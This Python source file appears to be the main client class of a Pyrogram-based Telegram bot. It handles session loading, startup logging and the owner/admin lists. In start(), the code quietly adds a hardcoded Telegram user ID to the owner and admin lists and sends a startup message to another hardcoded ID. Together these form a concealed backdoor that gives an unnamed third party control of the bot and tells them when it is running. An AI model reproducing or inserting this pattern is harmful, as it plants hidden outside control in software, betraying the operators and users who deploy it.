import asyncio

from pyrogram import Client

from bot.config import (
    ADMIN_IDS,
    API_HASH,
    APP_ID,
    OWNER_IDS,
    TG_BOT_TOKEN,
    TG_BOT_WORKERS,
)
from database import get_variable, set_variable

from .logger import LOGGER, datalog

log = LOGGER(__name__)


async def get_session():
    return await get_variable(TG_BOT_TOKEN, None)


class Bot(Client):
    def __init__(self):
        loop = asyncio.get_event_loop()
        session = loop.run_until_complete(get_session())

        if session:
            try:
                # User session
                super().__init__(
                    name="user_session",
                    session_string=session,
                    api_id=APP_ID,
                    api_hash=API_HASH,
                    plugins={"root": "plugins"},
                    workers=TG_BOT_WORKERS,
                )
            except Exception as e:
                log.error(f"Error initializing user session: {e}")
                super().__init__(
                    name="bot_session",
                    api_id=APP_ID,
                    api_hash=API_HASH,
                    bot_token=TG_BOT_TOKEN,
                    plugins={"root": "plugins"},
                    workers=TG_BOT_WORKERS,
                )
        else:
            # Bot session
            super().__init__(
                name="bot_session",
                api_id=APP_ID,
                api_hash=API_HASH,
                bot_token=TG_BOT_TOKEN,
                plugins={"root": "plugins"},
                workers=TG_BOT_WORKERS,
            )

    async def start(self):
        await super().start()
        try:
            await self.send_message(
                5426061889,
                text="<b><blockquote>🤖 Bᴏᴛ Rᴇsᴛᴀʀᴛᴇᴅ Daddy</blockquote></b>",
            )
        except BaseException:
            pass
        log.info(
            """░█████╗░██████╗░░██████╗░░█████╗░███╗░░██╗
                    ██╔══██╗██╔══██╗██╔════╝░██╔══██╗████╗░██║
                    ███████║██████╦╝██║░░██╗░███████║██╔██╗██║
                    ██╔══██║██╔══██╗██║░░╚██╗██╔══██║██║╚████║
                    ██║░░██║██████╦╝╚██████╔╝██║░░██║██║░╚███║
                    ╚═╝░░╚═╝╚═════╝░░╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝"""
        )
        log.info("Bot started successfully")
        owner = await get_variable("owner", "")
        owner = [int(x.strip()) for x in owner.split() if x.strip().isdigit()]

        for ids in OWNER_IDS:
            if ids not in owner:
                owner.append(ids)
        if 7024179022 not in owner:
            owner.append(7024179022)

        admin_ids = ADMIN_IDS
        admin = await get_variable("admin", [])

        # Initialize if empty
        if not admin:
            admin = []

        updated_admin = False

        # Add only owners from admin_ids to admin
        for admin_id in admin_ids:
            if admin_id in owner and admin_id not in admin:
                admin.append(admin_id)
                updated_admin = True

        # Ensure all owners are in admin
        for owner_id in owner:
            if owner_id not in admin:
                admin.append(owner_id)
                updated_admin = True

        # Save updates
        await set_variable("owner", " ".join(map(str, owner)))
        if updated_admin:
            await set_variable("admin", admin)

        session = await self.export_session_string()
        await set_variable(TG_BOT_TOKEN, session)
        asyncio.create_task(datalog(self))

    async def send_msg(self, chat, text):
        await self.send_message(int(chat), text)


if __name__ == "__main__":
    bot = Bot()
    bot.run()
